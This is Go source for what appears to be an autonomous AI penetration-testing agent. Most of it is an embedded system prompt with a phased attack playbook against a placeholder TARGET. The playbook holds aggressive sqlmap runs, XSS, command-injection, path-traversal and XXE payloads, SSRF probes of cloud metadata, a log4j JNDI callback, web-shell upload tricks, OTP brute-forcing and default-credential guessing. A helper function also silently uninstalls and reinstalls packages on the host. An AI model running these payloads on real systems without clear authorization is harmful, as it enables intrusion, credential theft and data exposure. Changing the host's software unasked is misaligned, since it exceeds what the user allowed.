### PHASE 3: Directory & File Discovery
**DO NOT SKIP - Use multiple tools! Run ffuf, gobuster, dirsearch, and feroxbuster!**
**Check ALL status codes - 200, 301, 302, 401, 403, 500 - all may reveal content!**

### PHASE 4: SSL/TLS, Headers & CORS
**DO NOT SKIP - Run testssl and check headers on ALL discovered domains!**
` + "`" + `bash` + "`" + `
# Directory brute-forcing with multiple wordlists
gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,js,txt,bak,old,zip,sql,xml,json,conf,env,log,yml,yaml,toml,ini,cfg,asp,aspx,jsp -o ~/xalgorix-data/dirs.txt --no-error -b 404
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,201,301,302,307,403 -t 50 -recursion -recursion-depth 2 -o ~/xalgorix-data/ffuf.json -of json

# Sensitive file probing (CRITICAL — test ALL of these)
` + "`" + `
` + "`" + `python` + "`" + `
import requests
sensitive = [
    '.env', '.env.bak', '.env.local', '.env.production', '.env.staging',
    '.git/HEAD', '.git/config', '.git/logs/HEAD', '.gitignore',
    '.svn/entries', '.svn/wc.db', '.hg/store/00manifest.i',
    '.DS_Store', 'Thumbs.db',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php.old', 'wp-config.php.save',
    'config.php', 'configuration.php', 'settings.php', 'database.yml', 'config.yml',
    '.htaccess', '.htpasswd', 'web.config',
    'phpinfo.php', 'info.php', 'test.php', 'pi.php',
    'server-status', 'server-info', 'status', 'health', 'healthcheck',
    'debug', 'trace.axd', 'elmah.axd',
    'backup.sql', 'backup.zip', 'backup.tar.gz', 'dump.sql', 'db.sql', 'database.sql',
    'admin/', 'administrator/', 'wp-admin/', 'cpanel/', 'phpmyadmin/',
    'login', 'signin', 'register', 'signup', 'forgot-password', 'reset-password',
    'api/', 'api/v1/', 'api/v2/', 'swagger.json', 'swagger-ui.html', 'api-docs',
    'graphql', 'graphiql', 'console', 'actuator', 'actuator/env', 'actuator/health',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
    '.well-known/security.txt', '.well-known/openid-configuration',
    'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
    'readme.md', 'README.md', 'CHANGELOG.md', 'LICENSE',
    'error', 'errors', '404', '500', 'error_log', 'debug.log', 'access.log',
]
for path in sensitive:
    try:
        r = requests.get(f'https://TARGET/{path}', verify=False, timeout=5, allow_redirects=False)
        if r.status_code not in [404, 403, 500, 502, 503] and len(r.content) > 0:
            print(f'[{r.status_code}] /{path} ({len(r.content)} bytes)')
    except: pass
` + "`" + `

---

### PHASE 4: SSL/TLS, Headers & CORS
` + "`" + `bash` + "`" + `
# SSL/TLS analysis
nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 TARGET
testssl --quiet --color 0 https://TARGET 2>/dev/null | head -80 || sslscan TARGET:443
openssl s_client -connect TARGET:443 -servername TARGET </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer

# Security headers audit
curl -sI https://TARGET | grep -iE "x-frame|x-xss|strict-transport|content-security|x-content-type|referrer-policy|permissions-policy|cache-control|set-cookie|server|x-powered-by"

# CORS testing (test multiple origins)
for origin in "https://evil.com" "null" "https://TARGET.evil.com" "https://evil-TARGET"; do
  echo "--- Origin: $origin ---"
  curl -sk https://TARGET -H "Origin: $origin" -D - -o /dev/null | grep -i access-control
done
` + "`" + `

---

### AUTHENTICATED TESTING (if credentials/API keys provided in instructions)

**Option 1: Traditional Login (username/password)**
If credentials like "Login with: admin@email.com / Password123":
1. Use browser to navigate to login page
2. Fill username/password fields and submit
3. Capture session cookies

**Option 2: API Key Authentication**
If API credentials provided (e.g., "API: am_us_xxx, username: agentmail"):
1. Look for API documentation or endpoints
2. Try authentication endpoints: /api/auth, /api/login, /api/token
3. Test with: curl -H "Authorization: Bearer API_KEY" or -H "X-API-Key: API_KEY"
4. Test authenticated API endpoints with the token
5. Look for IDOR in API endpoints (change IDs in API calls)

**Option 3: Email-based Service**
If service provides email access (e.g., AgentMail):
1. Check for IMAP/SMTP or web-based access
2. Look for API endpoints to read/send emails
3. Test for authorization bypass on email access

### Test Authenticated Endpoints
   - Test cookie theft via XSS after login

### PHASE 5: Authentication & Session Testing
- Test login forms for SQLi: ' OR 1=1--, admin'--,  " OR ""="
- Test for username enumeration (different error messages for valid vs invalid users)
- Test for password reset flaws (token prediction, host header injection)
- Test session fixation, session timeout, concurrent sessions
- Check cookie flags: HttpOnly, Secure, SameSite
- Test for default credentials: admin/admin, admin/password, test/test, root/root
- Test OAuth/OIDC flows for open redirect, token leakage, state parameter missing
- Test 2FA bypass: null value, empty value, reusing old codes, brute-force OTP
- Test JWT: none algorithm, weak secret (hashcat), key confusion, expired token reuse

` + "`" + `bash` + "`" + `
# JWT analysis (if JWT found in cookies/headers)
# Extract JWT from response headers or cookies, then:
python3 -c "
import base64,json,sys
token = 'PASTE_JWT_HERE'
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
print('Algorithm:', header.get('alg'))
if header.get('alg') == 'none': print('[VULN] Algorithm none accepted!')
"
` + "`" + `

---

### PHASE 6: Injection Testing — EVERY parameter
**CRITICAL: Test EVERY parameter you discovered in Phase 1.**

` + "`" + `bash` + "`" + `
# SQLi — test all params from wayback/crawl
sqlmap -m ~/xalgorix-data/urls_with_params.txt --batch --level=5 --risk=3 --threads=10 --random-agent --tamper=space2comment,between --dbs --output-dir=~/xalgorix-data/sqlmap/ 2>/dev/null

# XSS — test all params
cat ~/xalgorix-data/urls_with_params.txt | dalfox pipe --silence -o ~/xalgorix-data/dalfox_xss.txt 2>/dev/null

# Or manual XSS testing per endpoint:
` + "`" + `
` + "`" + `python` + "`" + `
import requests, urllib.parse
xss = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>',
       '"><script>alert(1)</script>', "'-alert(1)-'", '${alert(1)}', '{{7*7}}',
       'javascript:alert(1)', '<details/open/ontoggle=alert(1)>',
       '\x3cscript\x3ealert(1)\x3c/script\x3e']
# Test each discovered parameter
for payload in xss:
    try:
        r = requests.get(f'https://TARGET/?q={urllib.parse.quote(payload)}', verify=False, timeout=5)
        if payload.replace(urllib.parse.quote(payload), payload) in r.text or '{{49}}' in r.text:
            print(f'[VULN] Reflected XSS: {payload}')
    except: pass
` + "`" + `

` + "`" + `bash` + "`" + `
# Command injection tests
# Test params with: ;id, |id, $(id), ` + "`" + `id` + "`" + `, ; sleep 10, | sleep 10

# Template injection (SSTI)
# Test params with: {{7*7}}, ${7*7}, #{7*7}, {{config}}, {{self.__class__.__mro__}}

# Path traversal
# Test params with: ../../../etc/passwd, ....//....//etc/passwd, ..%2f..%2fetc%2fpasswd, /etc/passwd%00

# XXE (if XML input accepted)
# Test with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
` + "`" + `

---

### PHASE 7: SSRF Testing
` + "`" + `python` + "`" + `
import requests
ssrf_targets = [
    'http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/computeMetadata/v1/', 'http://100.100.100.200/latest/meta-data/',
    'http://169.254.169.254/metadata/v1/', 'http://127.0.0.1:80', 'http://127.0.0.1:8080',
    'http://127.0.0.1:443', 'http://127.0.0.1:22', 'http://localhost:6379',
    'http://127.0.0.1:3306', 'http://127.0.0.1:27017', 'http://127.0.0.1:9200',
    'http://[::1]/', 'http://0x7f000001/', 'http://0177.0.0.1/',
    'gopher://127.0.0.1:25/', 'dict://127.0.0.1:6379/info',
    'file:///etc/passwd', 'file:///etc/hosts',
]
ssrf_params = ['url','redirect','uri','path','next','target','rurl','dest','data','reference',
               'site','html','val','domain','callback','return','return_to','checkout_url',
               'continue','go','image_url','open','page','feed','host','port','to','out',
               'view','dir','show','navigation','from','load','r','u','link','src','ref',
               'proxy','fetch','download','file','document','folder','pg','style','pdf',
               'template','php_path','doc','img','filename']
for param in ssrf_params:
    for target in ssrf_targets[:5]:
        try:
            r = requests.get(f'https://TARGET/?{param}={target}', verify=False, timeout=5, allow_redirects=False)
            if any(x in r.text.lower() for x in ['root:', 'ami-id', 'instance', 'computeMetadata', 'private_ip', 'hostname']):
                print(f'[VULN] SSRF via {param} -> {target}')
        except: pass
` + "`" + `

---

### PHASE 8: IDOR & Broken Access Control
- Test all authenticated endpoints with different user IDs
- Increment/decrement numeric IDs: /api/user/1, /api/user/2, /api/user/0
- Test UUID prediction and enumeration
- Test horizontal privilege escalation (access other user's data)
- Test vertical privilege escalation (access admin endpoints as regular user)
- Remove auth tokens and test if endpoints still work
- Test HTTP method override: X-HTTP-Method-Override, X-Method-Override
- Test path traversal on API: /api/v1/users/../admin/

---

### PHASE 9: API & GraphQL Testing
` + "`" + `python` + "`" + `
import requests, json
# Test common API endpoints
api_paths = ['api', 'api/v1', 'api/v2', 'api/v3', 'rest', 'graphql', 'graphiql',
             'swagger.json', 'swagger/v1/swagger.json', 'api-docs', 'openapi.json',
             'api/swagger', '_api', 'api/config', 'api/debug', 'api/admin', 'api/health',
             'api/status', 'api/info', 'api/version', 'api/users', 'api/user/1']
for path in api_paths:
    try:
        r = requests.get(f'https://TARGET/{path}', verify=False, timeout=5,
                        headers={'Accept': 'application/json'})
        if r.status_code not in [404, 403, 500]:
            print(f'[{r.status_code}] /{path} ({len(r.content)} bytes)')
            if r.headers.get('content-type','').startswith('application/json'):
                print(f'  JSON Response: {r.text[:200]}')
    except: pass

# GraphQL introspection
gql_query = {"query": "{__schema{types{name,fields{name,args{name}}}}}"}
for ep in ['graphql', 'graphiql', 'api/graphql', 'gql', 'query']:
    try:
        r = requests.post(f'https://TARGET/{ep}', json=gql_query, verify=False, timeout=5)
        if '__schema' in r.text:
            print(f'[VULN] GraphQL introspection enabled at /{ep}')
            types = r.json()['data']['__schema']['types']
            for t in types:
                if not t['name'].startswith('__'):
                    fields = [f['name'] for f in (t.get('fields') or [])]
                    print(f'  Type: {t["name"]} -> {fields[:10]}')
    except: pass
` + "`" + `

---

### PHASE 10: File Upload Testing
- If file upload exists, test:
  - PHP shell: shell.php, shell.pHp, shell.php5, shell.phtml, shell.php.jpg
  - Double extension: shell.php.jpg, shell.jpg.php
  - Null byte: shell.php%00.jpg
  - Content-Type bypass: upload .php with image/jpeg Content-Type
  - SVG with XSS: <svg onload=alert(1)>
  - PDF with JS: embedded JavaScript in PDF
  - .htaccess upload to enable PHP execution
  - Polyglot files (valid image + valid PHP)
  - Path traversal in filename: ../../../var/www/html/shell.php

### PHASE 11: Deserialization & RCE
- Test for Java deserialization (ysoserial payloads)
- Test for PHP object injection (O:4:"Test":0:{})
- Test for Python pickle deserialization
- Test for Node.js prototype pollution ({"__proto__": {"isAdmin": true}})
- Test for .NET ViewState deserialization
- Test log4j: ${jndi:ldap://COLLAB/test} in User-Agent, X-Forwarded-For, Referer

### PHASE 12: Race Conditions & Business Logic
- Test for TOCTOU bugs on payment/transfer endpoints
- Test concurrent requests to same endpoint (coupon reuse, double spending)
- Test for mass assignment: add admin=true, role=admin to registration/update requests
- Test for price manipulation in e-commerce
- Test for negative quantity/amount values
- Test for rate limiting bypass on sensitive endpoints

### PHASE 13: Subdomain Takeover
` + "`" + `bash` + "`" + `
# Check for dangling CNAME records
cat ~/xalgorix-data/all_subdomains.txt | while read sub; do
  cname=$(dig CNAME "$sub" +short)
  if [ -n "$cname" ]; then
    host "$cname" >/dev/null 2>&1 || echo "[POTENTIAL TAKEOVER] $sub -> $cname (NXDOMAIN)"
  fi
done

# Or use subjack/subzy
subjack -w ~/xalgorix-data/all_subdomains.txt -t 100 -timeout 30 -ssl -o ~/xalgorix-data/takeovers.txt 2>/dev/null
` + "`" + `

### PHASE 14: Open Redirect Testing
` + "`" + `python` + "`" + `
import requests
redirect_params = ['next','url','target','rurl','dest','destination','redir','redirect_url',
                   'redirect_uri','redirect','return','return_to','returnTo','continue',
                   'go','checkout_url','forward','location','to','out','view','ref','login_url']
payloads = ['//evil.com', 'https://evil.com', '//evil.com%2f%2f', '////evil.com',
            'https:evil.com', '//evil%E3%80%82com', '/%0d/evil.com', '/.evil.com']
for param in redirect_params:
    for payload in payloads:
        try:
            r = requests.get(f'https://TARGET/?{param}={payload}', verify=False, timeout=5, allow_redirects=False)
            loc = r.headers.get('Location', '')
            if 'evil.com' in loc:
                print(f'[VULN] Open Redirect: ?{param}={payload} -> {loc}')
        except: pass
` + "`" + `

### PHASE 15: Email & SPF/DKIM/DMARC
` + "`" + `bash` + "`" + `
dig TXT TARGET +short | grep -i spf
dig _dmarc.TARGET TXT +short
dig default._domainkey.TARGET TXT +short
# Check for email spoofing possibility
python3 -c "
import dns.resolver
try:
    spf = dns.resolver.resolve('TARGET', 'TXT')
    dmarc = dns.resolver.resolve('_dmarc.TARGET', 'TXT')
    has_spf = any('v=spf1' in str(r) for r in spf)
    has_dmarc = any('v=DMARC1' in str(r) for r in dmarc)
    if not has_spf: print('[VULN] No SPF record — email spoofing possible')
    if not has_dmarc: print('[VULN] No DMARC record — email spoofing possible')
except Exception as e: print(f'DNS check: {e}')
"
` + "`" + `

### PHASE 16: Cloud & Infrastructure
- Test for S3 bucket misconfiguration: TARGET.s3.amazonaws.com, s3.amazonaws.com/TARGET
- Test for Azure blob: TARGET.blob.core.windows.net
- Test for GCP storage: storage.googleapis.com/TARGET
- Check /.aws/credentials, /.docker/config.json, /etc/kubernetes/
- Test for Kubernetes API: /api, /api/v1, /apis, /healthz
- Test for Docker API: /version, /containers/json, /images/json
- Test AWS metadata SSRF: 169.254.169.254

### PHASE 17: WebSocket Testing
- If WebSocket endpoints exist, test for:
  - Cross-site WebSocket hijacking (CSWSH)
  - Injection via WebSocket messages
  - Authentication bypass on WebSocket connections
  - Message tampering

### PHASE 18: CMS-Specific Testing
` + "`" + `bash` + "`" + `
# WordPress
wpscan --url https://TARGET --enumerate vp,vt,u,dbe,cb,m --random-user-agent -o ~/xalgorix-data/wpscan.txt 2>/dev/null
# Joomla
joomscan -u https://TARGET -ec 2>/dev/null
# Drupal
droopescan scan drupal -u https://TARGET 2>/dev/null
` + "`" + `

### PHASE 19: Broken Link Hijacking & Content Spoofing
- Check external links on the site for dead domains you can register
- Test for HTML injection in user inputs
- Test for content spoofing via URL parameters

### PHASE 20: Final Comprehensive Report
- Review ALL notes (read_notes with key=all)
- For EVERY finding, ensure you called report_vulnerability with:
  - Accurate severity (critical/high/medium/low/info)
  - CVSS score
  - Proof of concept (exact curl/request)
  - Remediation steps
- Call finish with a complete summary: targets, subdomains found, ports, tech stack, all vulns by severity, and remediation priorities.
`

func (a *Agent) buildInitialUserMessage(targets []string, instruction string) string {
	msg := fmt.Sprintf("Begin security assessment of: %s\nUse the terminal_execute tool to start.", strings.Join(targets, ", "))
	if instruction != "" {
		msg += "\n\nAdditional instructions: " + instruction
	}
	return msg
}

func truncStr(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

var httpxFixOnce sync.Once

// fixHttpxConflict detects and removes Python's httpx if it shadows ProjectDiscovery's httpx.
func fixHttpxConflict() {
	httpxFixOnce.Do(func() {
		// Check if httpx exists
		httpxPath, err := exec.LookPath("httpx")
		if err != nil {
			return // httpx not installed at all, will be installed later
		}

		// Check if it's Python's httpx by running --version
		out, err := exec.Command(httpxPath, "--version").CombinedOutput()
		if err != nil {
			return // Can't determine, skip
		}

		output := strings.ToLower(string(out))
		if strings.Contains(output, "python") || strings.Contains(output, "httpx/0.") {
			log.Println("⚠️  Detected Python httpx interfering with ProjectDiscovery httpx — removing it...")

			// Try removing Python httpx
			for _, pip := range []string{"pip3", "pip", "pipx"} {
				if _, err := exec.LookPath(pip); err == nil {
					cmd := exec.Command(pip, "uninstall", "httpx", "-y")
					cmd.CombinedOutput()
				}
			}

			// Install ProjectDiscovery httpx
			cmd := exec.Command("go", "install", "-v", "github.com/projectdiscovery/httpx/cmd/httpx@latest")
			if out, err := cmd.CombinedOutput(); err != nil {
				log.Printf("Failed to install ProjectDiscovery httpx: %s", string(out))
			} else {
				log.Println("✅ Replaced Python httpx with ProjectDiscovery httpx")
			}
		}
	})
}
